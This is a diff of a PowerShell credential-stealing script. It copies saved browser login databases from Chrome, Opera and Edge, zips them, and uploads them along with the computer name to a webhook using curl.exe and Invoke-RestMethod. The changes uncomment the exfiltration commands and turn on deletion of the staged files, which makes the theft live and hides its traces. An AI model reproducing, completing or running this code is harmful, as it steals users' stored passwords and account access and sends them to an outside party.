@@ -351,7 +351,7 @@ else{
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage1"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
-# curl.exe -F file1=@"$outpath" $hookurl
+curl.exe -F file1=@"$outpath" $hookurl
 # DOWNLOAD FILE PROFILE BROWSER
 $outpath = "$env:temp\B1555.005"
 if (test-path "$outpath") {} else {new-item -path "$env:temp" -Name "B1555.005" -ItemType "directory" -force}
@@ -364,7 +364,6 @@ if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For 
 if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$outpath\B1555.005Opera_Login Data"} else {}
 if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$outpath\B1555.005Edge_Login Data"} else {} 
 compress-archive -path "$outpath" -destinationpath "$outpath.zip" -force
-curl.exe -F file1=@"$outpath" $hookurl
-# curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $hookurl
+curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $hookurl
 Sleep 1
-# Remove-Item -Path $outpath -force
+Remove-Item -Path $outpath -force
